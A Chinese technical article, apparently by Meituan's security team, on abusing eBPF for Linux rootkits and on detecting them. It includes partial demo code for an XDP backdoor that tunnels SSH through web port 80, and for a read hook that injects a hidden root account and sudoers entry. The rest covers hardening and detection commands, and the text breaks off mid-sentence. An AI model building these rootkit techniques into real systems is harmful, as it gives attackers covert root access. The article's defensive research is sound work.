[
  {
    "title": "浅谈一下，Linux中基于eBPF的恶意利用与检测机制",
    "url": "https://www.infoq.cn/article/qlvqdfa3D6RvD3ywHcOx",
    "summary": "<p></p><h2>前言&nbsp;&nbsp;</h2><p></p><p></p><p>近几年，云原生领域飞速发展，Kubernetes 成为公认的云操作系统。容器的高频率部署、短暂的生命周期、复杂的网络路由，都给内核安全带来了新的挑战。系统内核面对的复杂性在不断增长，在满足性能、可扩展性等新需求的同时，还需要保障系统稳定可用，这是极其困难的事情。此时，eBPF出现，它以较小的子系统改动，保障了系统内核的稳定，还具备实时动态加载的特性，能将业务逻辑加载到内核，实现热更新的动态执行。</p><p></p><p>eBPF由BPF发展而来，BPF全称Berkeley Packet Filter，1992年由Steven McCanne和Van Jacobson提出，1997年引入Linux Kernel 2.1，3.0中增加了即时编译器，应用在网络过滤领域。2014年Alexei Starovoitov实现了eBPF并扩展到用户空间，威力更大。常用的TCPDUMP&amp;LIBPCAP就是基于它。在Linux Kernel 4.x中，扩展了内核态函数、用户态函数、跟踪点、性能事件（perf_events）以及安全控制等事件类型。尤其是近几年云原生快速发展，也带动了eBPF的繁荣。微软、Google、Facebook等企业成立eBPF基金会，Cilium公司也发布了基于eBPF技术实现的网络产品。不过，在eBPF技术带动新业务快速发展的同时，也带来了安全威胁。</p><p></p><h2>现状分析</h2><p></p><p>&nbsp;</p><p>我们可以从一些海外资料和国内资料中可以看到，eBPF在解决很多技术难题的同时，也被很多非法的组织和机构恶意利用。</p><p></p><h3>海外资料</h3><p></p><p></p><p>Black Hat</p><p></p><p>在Black Hat 2021的峰会中，Datadog工程师Guillaume Fournier带来主题为<a href=\"https://www.blackhat.com/us-21/briefings/schedule/#with-friends-like-ebpf-who-needs-enemies-23619\">《With Friends Like eBPF, Who Needs Enemies?》</a>\"的分享，他介绍了eBPF如何被恶意利用，包括如何构建一个rootkit、如何利用，并将检测防御代码放在了<a href=\"https://github.com/Gui774ume/ebpfkit\">GitHub</a>\"&nbsp;上。</p><p></p><p>DEF CON</p><p></p><p>在DEF CON29峰会上，安全研究员Pat Hogan也分享了一些eBPF被恶意利用的案例：<a href=\"https://defcon.org/html/defcon-29/dc-29-speakers.html#path\">《Warping Reality - creating and countering the next generation of Linux rootkits using eBPF》</a>\"&nbsp;，这里介绍了eBFP rootkit的应用场景，包括网络、运行时等场景，以及如何检测eBPF被恶意利用等。代码也放在了<a href=\"https://github.com/pathtofile/bad-bpf\">GitHub</a>\"&nbsp;上。</p><p></p><p><img src=\"https://static001.geekbang.org/infoq/f4/f47ab8e13c1c62df9d283d20edf6627c.jpeg\" /></p><p></p><h3>国内资料</h3><p></p><p></p><p>对比国外，国内eBPF被恶意利用的资料较少，相关技术分享也较少。可能这方面的危害还没有得到国内安全同行的关注，如果我们继续这样，势必影响到国内公司在网络安全防御体系层面的建设，进而导致安全防护落后于国外，给企业安全甚至国家安全带来较大的风险。美团信息安全团队作为防御体系的建设方，有责任也有义务带领大家更好地认识这种恶意利用，分享美团在检测防御方面的经验，加固网络安全产品，希望能为国内信息安全建设贡献一份绵薄之力。</p><p></p><h3>eBPF技术恶意利用的攻击原理</h3><p></p><p></p><p>知己知彼，才能百战不殆，要想做好防御，必须要了解它的攻击原理。我们先来看下eBPF的rootkit是如何设计的。从eBPF的功能来看，它提供了以下领域的功能：</p><p></p><p>网络监控观测跟踪&amp;性能分析安全</p><p></p><p>在网络领域，Cilium等云原生公司做了很多网络层的产品，在实现网格管理的同时，也做了相应的网络层面安全策略，尤其是在网络编排领域，表现尤为亮眼，逐步代替iptables等产品，大有一统江山的趋势。而在监控、观测等领域也有很多产品。尤其是运行时安全（Runtime Security）领域，Datadog、Falco、Google等公司也都推出了相应的产品。感兴趣的同学，可以参考相关产品源码分析（<a href=\"https://mp.weixin.qq.com/s?__biz=MzUyMDM0OTY5NA==&amp;mid=2247483747&amp;idx=1&amp;sn=6f0dce420f3dd412a52496e3ce3e2e38&amp;scene=21#wechat_redirect\">Cilium eBPF实现机制源码分析</a>\"、<a href=\"https://mp.weixin.qq.com/s?__biz=MzUyMDM0OTY5NA==&amp;mid=2247483757&amp;idx=1&amp;sn=f0cc24e6bdf6e0dea683575f706ca279&amp;scene=21#wechat_redirect\">Datadog的eBPF安全检测机制分析</a>\"）的分享。</p><p></p><p>我们回顾一下eBPF技术的hook点：</p><p><img src=\"https://static001.geekbang.org/infoq/69/697ee132e2eb3781271e3a46d02c09e1.png\" /></p><p>从图中可以看出，eBPF的hook点功能包括以下几部分：</p><p></p><p>可以在Storage、Network等与内核交互之前；也可以在内核中的功能模块交互之间；又可以在内核态与用户态交互之间；更可以在用户态进程空间。</p><p></p><p>eBPF的功能覆盖XDP、TC、probe、socket等，每个功能点都能实现内核态的篡改行为，从而使得用户态完全致盲，哪怕是基于内核模块的HIDS，一样无法感知这些行为。</p><p></p><p>基于eBPF的功能函数，从业务场景来看，网络、监控、观测类的功能促进了云原生领域的产品发展；跟踪/性能分析、安全类功能，加快了安全防御、审计类产品演进；而安全领域的恶意利用，也会成为黑客关注的方向。本文将与大家探讨一下新的威胁与防御思路。</p><p><img src=\"https://static001.geekbang.org/infoq/16/168b21990855e65ce01a1882abb73a9a.png\" /></p><p></p><p>从数据流所处阶段来看，本文划分为两部分，接下来一起来讨论恶意利用、风险危害与防御思路。</p><p></p><p>Linux网络层恶意利用Linux系统运行时恶意利用</p><p></p><h3>Linux网络层恶意利用</h3><p></p><p></p><p>以一个SSH、Web服务的服务器为例，在IDC常见网络访问策略中，开放公网Web 80端口允许任意来源的IP访问。而SSH服务只允许特定IP，或者只开放内网端口访问。</p><p></p><p>假设这台服务器已经被黑客入侵，黑客需要留下一个后门，且需要一个隐藏、可靠的网络链路作为后门通道，那么在eBPF技术上，会如何实现呢？</p><p></p><p>XDP/TC层修改TCP包</p><p></p><p>为了让后门隐藏的更好，最好是不开进程，不监听端口（当前部分我们只讨论网络层隐藏）。而eBPF技术在XDP、TC、Socket等内核层的功能，能够实现流量信息修改，这些功能常被应用在L3、L4的网络负载均衡上。比如Cilium的网络策略都是基于eBPF XDP实现。eBPF hook了XDP点后，更改了TCP包的目标IP，系统内核再将该数据包转发出去。</p><p></p><p>按照XDP与TC在Linux内核中，处理ingress与egress的位置，可以更准确地确定hook点。</p><p></p><p>XDP的BPF_PROG_TYPE_XDP程序类型，可以丢弃、修改、重传来自ingress的流量，但无法对egress起作用。TC的BPF_PROG_TYPE_SCHED_CLS除了拥有XDP“BPF_PROG_TYPE_XDP”的功能外，还可以对egress起作用。</p><p></p><p>前者最常用的场景就是做网络防火墙，用于网络流量清洗，效率比传统防火墙的高很多。后者常用于云原生场景下，容器、Pod的网络监控、安全访问控制等。在这个例子中，要对进出流量都做调整，故两个hook点都需要有。同样，在XDP等阶段的hook，在这里做相关包逻辑的处理，能更好地将通信包隐藏，tcpdump等工具都抓不到。</p><p></p><p>控制链路</p><p></p><p>在后门场景里，可以在同样的位置，像eBPF的负载均衡一样，修改目标端口，从Web Nginx的80改为SSHD的22，就可以实现网络数据的透传，绕开防火墙以及网络访问限制。</p><p></p><p>认证密钥</p><p></p><p>由于后门rootkit是在XDP\\TC层工作，为了尽可能的简单，认证密钥最好只使用链路层、网络层、传输层的数据，即MAC信息、IP五元组之类。IP经常变动，MAC地址大概率是唯一的，以及设定一个固定的端口，这样更加唯一，作为rootkit的认证密钥即可实现（需要Client发起连接时，指定客户端的TCP端口）。</p><p></p><p>eBPF uprobe与eBPF map联动</p><p></p><p>对于后门rootkit的密钥更新，利用eBPF也很好实现。比如在Nginx的场景中，uprobe实现hook HTTP的函数，获取URL参数中特定字符串，再将字符串保存到eBPF map里，就实现了密钥更新。</p><p></p><p>XDP/TC层的eBPF rootkit执行时，读取eBPF map里的密钥，进行比较运算。</p><p></p><p>实现流程</p><p></p><p>举个XDP处理ingress的例子：</p><p><code lang=\"null\">SEC(\"xdp/ingress\")\nint xdp_ingress(struct xdp_md *ctx) {\nstruct cursor c;\nstruct pkt_ctx_t pkt;\n\n//判断是否为SSHD的协议，不是则直接放行\nif (!(不是SSHD协议(&amp;c))) {\nreturn XDP_PASS;\n}\n\n//判断rootkit是否匹配，网卡信息与来源端口是否匹配\nhack_mac[] = \"读取bpf map配置。\"\nif(密钥不匹配) {\nreturn XDP_PASS;\n}\n\n// 读取map，是否已经存在该client信息\nstruct netinfo client_key = {};\n__builtin_memcpy(&amp;client_key.mac, &amp;pkt.eth-&gt;h_source, ETH_ALEN);\n\nstruct netinfo *client_value;\nclient_value = bpf_map_lookup_elem(&amp;ingress_client, &amp;client_key);\n\n// 如果没找到伪装信息，则自己组装\nif(!client_value) {\n__builtin_memset(&amp;client_value, 0, sizeof(client_value));\n} else {\nbpf_map_update_elem(&amp;ingress_client, &amp;client_key, &amp;client_value, BPF_ANY);\n}\n\n\n// 伪装mac局域网mac信息\npkt.eth-&gt;h_source[0] = 0x00;\n...\n\n// 替换伪装ip来源 ，客户端端口不变\n\n// 更改目标端口\npkt.tcp-&gt;dest = htons(FACK_PORT);    //22\n\n//计算TCP SUM layer 4\nipv4_csum(pkt.tcp, sizeof(struct tcphdr), &amp;csum);\npkt.tcp-&gt;check = csum;\n\n//写入已伪装的map，用于TC处理egress的原mac、IP信息还原。\nreturn XDP_PASS;\n}</code></p><p></p><p>比较简单的Demo，即可实现ingress侧TCP数据包的伪装。同样，TC层处理egress方向的数据包时，只需要对伪装包的原始信息作还原即可。整个流程如下图所示：</p><p></p><p><img src=\"https://static001.geekbang.org/infoq/ed/ed744c152e59024ceab522f0809c9843.jpeg\" /></p><p></p><p>这样，rootkit的通信链路并不影响正常用户访问，也没有对原系统做改动，隐蔽性特别好。</p><p></p><p>视频演示</p><p></p><p>笔者准备了三台主机测试：</p><p></p><p>入侵者：cnxct-mt2，IP为172.16.71.1。普通用户：ubuntu，IP为172.16.71.3。被入侵服务器：vm-ubuntu，IP为172.16.71.4。开放nginx web 80端口；开放SSHD 22端口，并设定iptables规则只允许内网IP访问。</p><p></p><p></p><p></p><p>危害</p><p></p><p>这个rootkit不主动创建Socket，借用其中一个网络发送包，把消息送达给后门使用者。对系统影响来说，只是一个不起眼的小网络响应。在万千HTTP包里，根本定位不到。</p><p></p><p>iptables防火墙绕过：利用对外开放的80端口作为通信隧道；WebIDS绕过：流量到达服务器后，并不传递给Nginx；NIDS绕过：入侵者流量在局域网之间流传并无异常，只是无法解密；HIDS绕过：是否信任了防火墙，忽略了本机/局域网来源的SSHD登录。</p><p></p><h3>Linux系统运行时恶意利用</h3><p></p><p></p><p>云原生生态下，涌现大批基于eBPF技术实现的集群网络管理插件，比如Calico、Cilium等。而业务实现网络管理服务是以容器化方式部署，且有需要给这些容器启用SYS_BPF_ADMIN权限以支持eBPF系统调用。这些服务的运行环境，也给攻击者留下一个完美的发挥空间。</p><p></p><p>实现流程</p><p></p><p>回顾eBPF的hook点，作用在syscall的kprobe、tracepoint事件类型，倘若用在后门rootkit场景，是十分可怕的。比如修改内核态返回给用户态的数据、拦截阻断用户态行为等，为所欲为。而更可怕的是，常见的HIDS都是基于内核态或者用户态做行为监控，eBPF恰恰绕开了大部分HIDS的监控，且不产生任何日志，简直让人“细思极恐、不寒而栗”。</p><p></p><p>tracepoint事件类型hook</p><p></p><p>在SSHD应用中，当用户登录时，会读取/etc/passwd等文件。用户态SSHD程序，调用open、read等系统调用，让内核去硬件磁盘上检索数据，再返回数据给SSHD进程。</p><p></p><p>用户态生成payload</p><p></p><p>用户态实现/etc/passwd、/etc/shadow等文件payload的生成，并通过eBPF的RewriteConstants机制，完成对ELF .rodata的字段值替换。</p><p></p><p><code lang=\"null\">import \"github.com/ehids/ebpfmanager\"\n\n//  通过elf的常量替换方式传递数据\nfunc (e *MBPFContainerEscape) constantEditor() []manager.ConstantEditor {\n var username = RandString(9)\n var password = RandString(9)\n var s = RandString(8)\n\n salt := []byte(fmt.Sprintf(\"$6$%s\", s))\n // use salt to hash user-supplied password\n c := sha512_crypt.New()\n hash, err := c.Generate([]byte(password), salt)\n    \n var m = map[string]interface{}{}\n res := make([]byte, PAYLOAD_LEN)\n var payload = fmt.Sprintf(\"%s ALL=(ALL:ALL) NOPASSWD:ALL #\", username)\n copy(res, payload)\n m[\"payload\"] = res\n m[\"payload_len\"] = uint32(len(payload))\n\n    // 生成passwd字符串\n var payload_passwd = fmt.Sprintf(\"%s:x:0:0:root:/root:/bin/bash\\n\", username)\n // 生成shadow字符串\n var payload_shadow = fmt.Sprintf(\"%s:%s:18982:0:99999:7:::\\n\", username, hash)\n \n    // eBPF RewriteContants\n    var editor = []manager.ConstantEditor{\n  {\n   Name:          \"payload\",\n   Value:         m[\"payload\"],\n   FailOnMissing: true,\n  },\n  {\n   Name:          \"payload_len\",\n   Value:         m[\"payload_len\"],\n   FailOnMissing: true,\n            },\n    }\n    return editor\n}\n\nfunc (this *MBPFContainerEscape) setupManagers() {\n this.bpfManager = &amp;manager.Manager{\n  Probes: []*manager.Probe{\n   {\n    Section:          \"tracepoint/syscalls/sys_enter_openat\",\n    EbpfFuncName:     \"handle_openat_enter\",\n    AttachToFuncName: \"sys_enter_openat\",\n   },\n            ...\n  },\n\n  Maps: []*manager.Map{\n   {\n    Name: \"events\",\n   },\n  },\n }\n\n this.bpfManagerOptions = manager.Options{\n  ...\n  // 填充 RewriteContants 对应map\n  ConstantEditors: this.constantEditor(),\n }\n}</code></p><p></p><p>内核态使用payload</p><p></p><p><code lang=\"text\">const volatile int payload_len = 0;\n...\nconst volatile char payload_shadow[MAX_PAYLOAD_LEN];\n\nSEC(\"tracepoint/syscalls/sys_exit_read\")\nint handle_read_exit(struct trace_event_raw_sys_exit *ctx)\n{\n    // 判断是否为rootkit行为，是否需要加载payload\n    ...\n    long int read_size = ctx-&gt;ret;\n    // 判断原buff长度是否小于payload\n    if (read_size &lt; payload_len) {\n        return 0;\n    }\n    \n    // 判断文件类型，匹配追加相应payload\n    switch (pbuff_addr-&gt;file_type)\n    {\n    case FILE_TYPE_PASSWD:\n        // 覆盖payload到buf，不足部分使用原buff内容\n        {\n            bpf_probe_read(&amp;local_buff, MAX_PAYLOAD_LEN, (void*)buff_addr);\n            for (unsigned int i = 0; i &lt; MAX_PAYLOAD_LEN; i++) {\n                if (i &gt;= payload_passwd_len) {\n                    local_buff[i] = ' ';\n                }\n                else {\n                    local_buff[i] = payload_passwd[i];\n                }\n            }\n        }\n        break;\n    case FILE_TYPE_SHADOW:\n        // 覆盖 shadow文件\n        ...\n        break;\n    case FILE_TYPE_SUDOERS:\n        //覆盖sudoers\n        ...\n        break;\n    default:\n        return 0;\n        break;\n    }\n\n\n    // 将payload内存写入到buffer\n    ret = bpf_probe_write_user((void*)buff_addr, local_buff, MAX_PAYLOAD_LEN);\n    // 发送事件到用户态\n   \n    return 0;\n}</code></p><p></p><p>按照如上Demo rootkit的设计，即完成了随机用户名密码的root账号添加。在鉴权认证上，也可以配合“eBPF网络层恶意利用”的Demo，利用eBPF map交互，实现相应鉴权。但rootkit本身并没有更改硬盘上文件，不产生风险行为。并且，只针对特定进程的做覆盖，隐蔽性更好。整个流程如下图所示：</p><p></p><p><img src=\"https://static001.geekbang.org/infoq/0a/0a63a5ed111aabdd8b0371590fb7aca5.jpeg\" /></p><p></p><p>不管是在物理机上，还是给了root+BPF权限的容器上，都一样生效。</p><p></p><p>视频演示</p><p></p><p></p><p></p><h4>严重危害</h4><p></p><p></p><p>云原生场景下，赋予SYS_ADMIN权限的容器场景很多，若配合近期的“Java log4j”漏洞，直接击穿容器，拿到宿主机权限，是不是很可怕？</p><p></p><p>然而，比这可怕的是：这种rootkit本身并没有产生用户态行为日志，也没有改文件，系统里查不到这个用户信息。整个后门行为不产生数据，让大部分HIDS失灵。</p><p></p><h3>综述</h3><p></p><p></p><p>从本文演示的这两个场景可以来看，相信大家已经知道了eBPF技术被恶意利用的危害性。其实，这只是eBPF技术被恶意利益的“冰山一角”，在kproeb\\uprobe上也有很多功能，比如实现进程隐藏、无痕内网扫描等等。更多相关的恶意利用，大家可参考<a href=\"https://blog.tofile.dev/2021/08/01/bad-bpf.html\">Bad BPF - Warping reality using eBPF</a>\"一文。</p><p></p><p>若入侵者精心设计rootkit，实现进程隐藏等，让rootkit更加隐蔽，按照本文的思路，实现一个“幽灵般”的后门，想想就让人后怕。</p><p></p><p>常规的主机安全防御产品一般用Netlink、Linux Kernel Module等技术实现进程创建、网络通信等行为感知，而eBPF的hook点可以比这些技术更加深，比它们执行更早，意味着常规HIDS并不能感知发现它们。</p><p>传统rootkit，采用hook api的方法，替换原来函数，导致执行函数调用地址发生变化，已有成熟检测机制，eBPF hook不同于传统rootkit，函数调用堆栈不变。这给检测带来很大的麻烦。</p><p></p><p>那面对这种后门，我们该如何检测防御呢？</p><p></p><h2>检测防御</h2><p></p><p></p><p>从事件发生的过程来看，分为三个阶段：</p><p></p><p>运行前运行时运行后</p><p></p><p><img src=\"https://static001.geekbang.org/infoq/c5/c5440b12632f9dc1728f5df6ad018957.png\" /></p><p></p><h3>运行前&nbsp;</h3><p></p><p></p><p>在恶意程序运行前，减少攻击面，这个思路是不变的。</p><p></p><h4>环境限制</h4><p></p><p></p><p>不管是宿主机还是容器，都进行权限收敛，能不赋予SYS_ADMIN、CAP_BPF等权限，就禁止掉。若一定要开放这个权限，那么只能放到运行时的检测环节了。</p><p></p><h4>seccomp限制&nbsp;</h4><p></p><p></p><p>在容器启动时，修改默认seccomp.json，禁止bpf系统调用，防止容器逃逸，注意此方法对于Privileged特权容器无效。</p><p></p><h4>内核编译参数限制</h4><p></p><p></p><p>修改函数返回值做运行时防护时，需要用到bpf_override_return，该函数需要内核开启CONFIG_BPF_KPROBE_OVERRIDE编译参数，因此非特殊情况不要开启该编译参数。</p><p></p><h4>非特权用户指令</h4><p></p><p></p><p>大部分eBPF程序类型都需要root权限的用户才能调用执行。但有几个例外，比如BPF_PROG_TYPE_SOCKET_FILTER和BPF_PROG_TYPE_CGROUP_SKB这两个类型，就不需要root。但需要读取系统配置开关。</p><p></p><p><code lang=\"null\">//https://elixir.bootlin.com/linux/v5.16.9/source/kernel/bpf/syscall.c#L2240\n\nif (type != BPF_PROG_TYPE_SOCKET_FILTER &amp;&amp;\n     type != BPF_PROG_TYPE_CGROUP_SKB &amp;&amp;\n     !bpf_capable())\n  return -EPERM;</code></p><p></p><p>开关确认</p><p></p><p>在/proc/sys/kernel/unprivileged_bpf_disabled里，可通过执行sysctl kernel.unprivileged_bpf_disabled=1来修改配置。配置含义见<a href=\"https://www.kernel.org/doc/html/latest/admin-guide/sysctl/kernel.html#unprivileged-bpf-disabled\">Documentation for /proc/sys/kernel/</a>\"。</p><p></p><p>值为0表示允许非特权用户调用bpf；值为1表示禁止非特权用户调用bpf且该值不可再修改，只能重启后修改；值为2表示禁止非特权用户调用bpf，可以再次修改为0或1。</p><p></p><h4>特征检查&nbsp;</h4><p></p><p></p><p>有人提议，在内核加载BPF字节码时，进行签名验证，以便达到只加载安全签名的BPF字节码。在lwn.net中也列出这个话题：<a href=\"https://lwn.net/Articles/853489/\">BPF字节码签名计划</a>\"。</p><p></p><p>但很多人也提出<a href=\"https://lwn.net/Articles/854386/\">反对意见</a>\"，他们认为BPF模块这几年的发展，过于抽象化，越来越复杂，所以不希望加入额外的功能，让BPF更加不稳定。而是改变思路，让字节码加载时签名，改为“执行BPF字节码加载的用户态程序进行签名”，这个是已有的内核功能，不会增加系统复杂性。</p><p></p><p>本文认为，这确实可以缓解大部分BPF字节码加载的问题。但使用系统原生命令（tc\\ip\\bpftool等）加载的话，仍面临威胁。比如：ip link set dev ens33 xdp obj xdp-example_pass.o。</p><p></p><p><img src=\"https://static001.geekbang.org/infoq/e8/e83459fafffd260dd3b9f15c4c37a287.jpeg\" /></p><p></p><h4>运行检查</h4><p></p><p></p><p>大部分eBPF程序在重启后不存在了，所以入侵者会尽可能让后门自启动。对于Linux系统的自启动、crontab等计划任务做好检查。</p><p></p><p>用户态程序可以以各种形式存在，ELF可执行文件、ELF so动态链接库都可以。在执行时，必定会调用BPF syscall来加载BPF字节码。若只是对可执行ELF做检测，还不够准确。</p><p></p><h3>运行时</h3><p></p><p></p><h4>监控&nbsp;</h4><p></p><p></p><p>Linux系统中，所有的程序运行，都必须进行系统调用，eBPF程序也不例外。需要调用syscall为321的SYS_BPF指令。并且，所有的eBPF程序执行、map创建都必须进行这个syscall调用。那么，在这个必经之路进行拦截监控，是最好的方案。</p><p></p><p><code lang=\"null\">SEC(\"tracepoint/syscalls/sys_enter_bpf\")\nint tracepoint_sys_enter_bpf(struct syscall_bpf_args *args) {\n struct bpf_context_t *bpf_context = make_event();\n if (!bpf_context)\n  return 0;\n bpf_context-&gt;cmd = args-&gt;cmd;\n get_common_proc(&amp;bpf_context-&gt;procinfo);\n send_event(args, bpf_context);\n    return 0;\n}</code></p><p></p><p>这里，我们开源的ehids项目做了一个BPF syscall检测的例子，大家可以Fork了解。仓库地址为：<a href=\"https://github.com/ehids/ehids-agent/blob/master/kern/bpf_call_kern.c\">GitHub/ehids</a>\"。</p><p></p><p>细心的读者这时可能会有疑问，假如入侵者的后门执行比较早，对这个系统调用进行欺骗，那怎么办呢？这是一个非常好的问题，我们将放到运行后的溯源章节进行讨论。但对于大部分场景，HIDS防御产品还是可以做到第一时间启动的。</p><p></p><h4>审计&amp;筛查&nbsp;</h4><p></p><p></p><p>上面我们讨论了对BPF系统的调用进行监控。而在云原生场景中，基于eBPF实现的网络产品会频繁调用，会产生大量的事件日志，从而给运营同学带来较大的压力。那么，对行为做精简、做精确筛选，就成为我们接下来的目标。</p><p></p><p>根据程序白名单筛选</p><p></p><p>数据过滤，是解决大量数据压力的一种方案。在一些BPF应用的业务服务器上，本身业务行为会产生大量调用，会给安全预警带来较大审计压力。对于已知的进程，我们可以根据进程特征过滤。</p><p></p><p>获取当前进程pid、comm等属性，根据用户态写入eBPF map的配置，决定是否上报、是否拦截。也可以在用户态做过滤，但内核态效率更高。如果是做拦截，那必须要在内核态实现。</p><p></p><p>大家可以参考<a href=\"https://github.com/ehids/slide/blob/master/security/2021-Secure_Namespaced_Kernel_Audit_for_Containers.pdf\">saBPF产品设计思路</a>\"&nbsp;，用eBPF实现LSM hook点的钩子程序，完成相关审计调用。虽然<a href=\"https://github.com/saBPF-project/sabpf-kernel\">GitHub/saBPF-project</a>\"&nbsp;的项目代码还只是Demo，但思路可以借鉴。</p><p><img src=\"https://static001.geekbang.org/infoq/5d/5d1aa311e1c1ad920e9035485d969000.png\" /></p><p></p><h4>根据SYSCALL类型筛选</h4><p></p><p></p><p>在BPF syscall里，子命令的功能包含map、prog等多种类型的操作，<a href=\"https://www.kernel.org/doc/html/latest/userspace-api/ebpf/syscall.html\">bpf() subcommand reference</a>\"&nbsp;里有详细的读写API。在实际的业务场景里，“写”的安全风险比“读”大。所以，我们可以过滤掉“读”操作，只上报、审计“写”操作。</p><p></p><p>比如：</p><p>MAP的创建BPF_MAP_CREATEPROG加载BPF_PROG_LOADBPF_OBJ_PINBPF_PROG_ATTACHBPF_BTF_LOADBPF_MAP_UPDATE_BATCH</p><p></p><p>尤其是有BPF需求的业务场景，可以更好的审计日志。</p><p></p><h3>运行后</h3><p></p><p></p><p>这里提几个问题，eBPF用户态程序与内核态程序交互，加载BPF字节码后，能退出吗？退出后，内核hook的BPF函数还工作吗？创建的map是否还存在？后门程序为了保证更好的隐蔽性，我们当如何选择？</p><p></p><p>如果要回答这些问题，不得不提BPF程序的加载机制，BPF对象生命周期。</p><p></p><h4>文件描述符与引用计数器</h4><p></p><p></p><p>用户态程序通过文件描述符FD来访问BPF对象（progs、maps、调试信息），每个对象都有一个引用计数器。用户态打开、读取相应FD，对应计数器会增加。若FD关闭，引用计数器减少，当refcnt为0时，内核会释放BPF对象，那么这个BPF对象将不再工作。</p><p></p><p>在安全场景里，用户态的后门进程若退出后，后门的eBPF程序也随之退出。在做安全检查时，这可以作为一个有利特征，查看进程列表中是否包含可疑进程。</p><p></p><p>但并非所有BPF对象都会随着用户态进程退出而退出。从内核原理来看，只需要保证refcnt大于0，就可以让BPF对象存活，让后门进程持续工作了。其实在BPF的程序类型中，像XDP、TC和基于CGROUP的钩子是全局的，不会因为用户态程序退出而退出。相应FD会由内核维护，保证refcnt计数器不为零，从而继续工作。</p><p></p><h4>溯源&nbsp;</h4><p></p><p></p><p>安全工程师经常需要根据不同场景作不同的溯源策略。本文给的溯源方式中，都使用了eBPF的相关接口，这意味着：如果恶意程序比检查工具运行的早，那么对于结果存在伪造的可能。</p><p></p><p>短生命周期</p><p></p><p>BPF程序类型代表</p><p></p><p>k[ret]probeu[ret]probetracepointraw_tracepointperf_eventsocket filtersso_reuseport</p><p></p><p>特点是基于FD管理，内核自动清理，对系统稳定性更好。这种程序类型的后门，在排查时特征明显，就是用户态进程。并且可以通过系统正在运行的BPF程序列表中获取。</p><p></p><p>bpftool工具</p><p></p><p>eBPF程序列表</p><p></p><p>命令bpftool prog show，以及bpftool prog help查看更多参数。</p><p></p><p><img src=\"https://static001.geekbang.org/infoq/00/00296d17dc6d8398f793d7b87b623e5c.jpeg\" /></p><p></p><p>结果中，可以看到当前系统正在运行的BPF程序、关联的BPF map ID，以及对应的进程信息等。另外，细心的读者可能发现，结果中，XDP数据中并没有进程ID信息，稍后讨论。</p><p></p><p>eBPF map列表</p><p></p><p>命令bpftool map show，以及bpftool map help可以查看更多参数。</p><p></p><p><img src=\"https://static001.geekbang.org/infoq/99/99613d05890ee4b27b1e058717b1f5e9.jpeg\" /></p><p></p><p>通过查看map信息，可以与程序信息作辅助矫正。并且，可以导出map内数据用来识别恶意进程行为。这部分我们在“取证”章节讨论。</p><p></p><p>bpflist-bpfcc</p><p></p><p>bpflist-bpfcc -vv命令可以看到当前服务器运行的部分BPF程序列表。以笔者测试环境为例：</p><p><code lang=\"null\">root@vmubuntu:/home/cfc4n/project/xdp## bpflist-bpfcc  -vv\nopen kprobes:\n\nopen uprobes:\n\nPID    COMM             TYPE  COUNT\n1      systemd          prog  8\n10444  ehids            map   4\n10444  ehids            prog  5</code></p><p></p><p>可以看到系统进程systemd启动了8个prog程序。ehids进程创建了4个eBPF map与5个prog。但实际上前面也执行了ip link set dev ens33 xdp obj xdp-example_pass.o命令，在这里却没有显示出来。意味着这个命令输出的结果并不是所有bpf程序、map的情况。</p><p></p><p><img src=\"https://static001.geekbang.org/infoq/e3/e36f5f5235bfd3ee2bca77c0a7c4792a.jpeg\" /></p><p></p><p>长生命周期</p><p></p><p>BPF程序类型代表</p><p></p><p>XDPTCLWTCGROUP</p><p></p><p>上面提到以ip命令加载BPF字节码的场景，常见BPF工具查询不到或信息缺失。这背后原因，需要从它的工作原理讲起。</p><p></p><p>ip命令加载bpf原理</p><p></p><p>BPF对象的生命周期使用引用计时器管理，这一大原则是所有BPF对象都需要遵守的。而长生命周期的程序类型起FD是用户控件程序传递参数给内核空间，之后再由内核空间维持。</p><p></p><p>以前面提到的IP命令ip link set dev ens33 xdp obj xdp-example_pass.o为例。ip命令的参数中包含bpf字节码文件名，ip进程打开.o字节码的FD，通过NETLINK发IFLA_XDP类型消息（子类型IFLA_XDP_FD）给内核，内核调用dev_change_xdp_fd函数，由网卡接管FD，引用计数器递增，用户空间的ip进程退出后，BPF程序依旧工作。内核源码参见：<a href=\"https://elixir.bootlin.com/linux/v5.16.10/source/tools/lib/bpf/netlink.c#L237\">elixir.bootlin.com/linux</a>\"。</p><p></p><p>本文做了抓包验证，ip程序关联XDP程序类型：</p><p></p><p><code lang=\"null\">17:53:22.553708 sendmsg(3, \n {\n msg_name={sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, \n msg_namelen=12, \n msg_iov=[\n  {\n   iov_base={\n    {nlmsg_len=52, nlmsg_type=RTM_NEWLINK, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=1642672403, nlmsg_pid=0}, \n    {ifi_family=AF_UNSPEC, ifi_type=ARPHRD_NETROM, ifi_index=if_nametoindex(\"ens33\"), ifi_flags=0, ifi_change=0}, \n    {\n     {nla_len=20, nla_type=IFLA_XDP}, \n     [\n      {{nla_len=8, nla_type=IFLA_XDP_FD}, 6}, \n      {{nla_len=8, nla_type=IFLA_XDP_FLAGS}, XDP_FLAGS_UPDATE_IF_NOEXIST}\n     ]\n    }\n   },\n   iov_len=52\n  }\n  ], \n msg_iovlen=1, \n msg_controllen=0, \n msg_flags=0\n }, 0) = 52</code></p><p></p><p>可以看到IFLA_XDP_FD后面的FD参数是6。同样，删除XDP程序，需要把FD设置为-1，对应NETLINK包构成如下：</p><p></p><p><code lang=\"null\"> 17:55:16.306843 sendmsg(3, \n {\n ...\n     {nla_len=20, nla_type=IFLA_XDP}, \n     [\n      {{nla_len=8, nla_type=IFLA_XDP_FD}, -1}, \n      {{nla_len=8, nla_type=IFLA_XDP_FLAGS}, XDP_FLAGS_UPDATE_IF_NOEXIST}\n     ] }\n ...\n }, 0) = 52</code></p><p></p><p>不止ip命令，<a href=\"https://man7.org/linux/man-pages/man8/tc-bpf.8.html\">TC命令分类器</a>\"&nbsp;也是支持BPF程序，将BPF程序作为classifiers和 act ions加载到ingress/egress hook点。背后原理与IP类似，也是NetLink协议与内核通信，网卡维持BPF对象计数器。</p><p></p><p>检测机制</p><p></p><p>使用原生IP、TC等命令，查看网卡加载的BPF对象。</p><p></p><p>ip link showtc filter show dev [网卡名] [ingress|egress]</p><p></p><p><img src=\"https://static001.geekbang.org/infoq/e0/e0e5aa6ff4b3741ae533d521020f5cfa.jpeg\" /></p><p></p><p>使用bpftool命令查看</p><p></p><p>bpftool net show dev ens33 -p命令可以用于查看网络相关的eBPF 